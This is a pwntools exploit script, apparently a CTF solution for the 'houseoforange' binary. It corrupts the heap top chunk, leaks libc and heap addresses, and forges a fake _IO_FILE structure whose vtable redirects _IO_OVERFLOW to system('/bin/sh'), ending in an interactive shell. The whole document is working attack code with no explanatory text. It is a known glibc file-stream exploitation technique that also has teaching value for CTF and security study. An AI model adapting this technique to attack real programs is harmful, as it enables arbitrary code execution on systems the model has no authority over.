#coding=utf8
from pwn import *
#context.log_level = 'debug'
#context.terminal = ['gnome-terminal','-x','bash','-c']
local = 1
if local:
	cn = process('./houseoforange')
	bin = ELF('./houseoforange')
	libc = ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
else:
	pass
def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def build(size,name,price,color):
	cn.recvuntil(":")
	cn.sendline("1")
	cn.recvuntil(":")
	cn.sendline(str(size))
	cn.recvuntil(":")
	cn.send(name)
	cn.recvuntil(":")
	cn.sendline(str(price))
	cn.recvuntil(":")
	cn.sendline(str(color))

def see():
	cn.recvuntil(":")
	cn.sendline("2")

def upgrade(size,name,price,color):
	cn.recvuntil(":")
	cn.sendline("3")
	cn.recvuntil(":")
	cn.sendline(str(size))
	cn.recvuntil(":")
	cn.send(name)
	cn.recvuntil(":")
	cn.sendline(str(price))
	cn.recvuntil(":")
	cn.sendline(str(color))

#top_chunk_size->0xfa1
offset_main_arena = libc.symbols['__malloc_hook'] + 0x20
success('offset_main_arena:'+hex(offset_main_arena))
build(16,'aaaa',1,1)
pay = 'b'*16+p64(0)+p64(0x21)+'b'*16+p64(0)+p64(0xfa1)
upgrade(0x200,pay,1,1)

#triger free in _sys_malloc
build(0x1000,'cccc',1,1)

#leak libc base
build(0x400,'dddddddd',1,1)
see()
cn.recvuntil('dddddddd')
d = cn.recv(6).ljust(8,'\x00')
libc_base = u64(d)-1640-0x3c4b20
success('libc_base: '+hex(libc_base))
system = libc_base+libc.symbols['system']
_IO_list_all=libc_base+libc.symbols['_IO_list_all']
success('system: '+hex(system))
success('_IO_list_all: '+hex(_IO_list_all))
#leak heap base
upgrade(0x400,'d'*16,1,1)
see()
cn.recvuntil('d'*16)
d = cn.recvuntil('\n')[:-1].ljust(8,'\x00')
heap_base=u64(d)-0xc0
success('heap_base: '+hex(heap_base))
pay='e'*0x400
pay+=p64(0)+p64(0x21)
pay+=p32(1)+p32(0x1f)+p64(0)
from FILE import *
context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = u64('/bin/sh\x00')
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base=_IO_list_all-0x10
fake_file._IO_write_base=0
fake_file._IO_write_ptr=1
fake_file._mode=0
fake_file.vtable=heap_base+0x4f0+fake_file.size
pay += str(fake_file)
pay += p64(0)*3 # vtable
pay += p64(system)#_IO_OVERFLOW
upgrade(0x800,pay,1,1)
z()
#z('set follow-fork-mode parent\nc')
#z('directory ~/glibc-2.23/malloc/\nb _int_malloc\nc')
cn.sendline('1')
cn.interactive()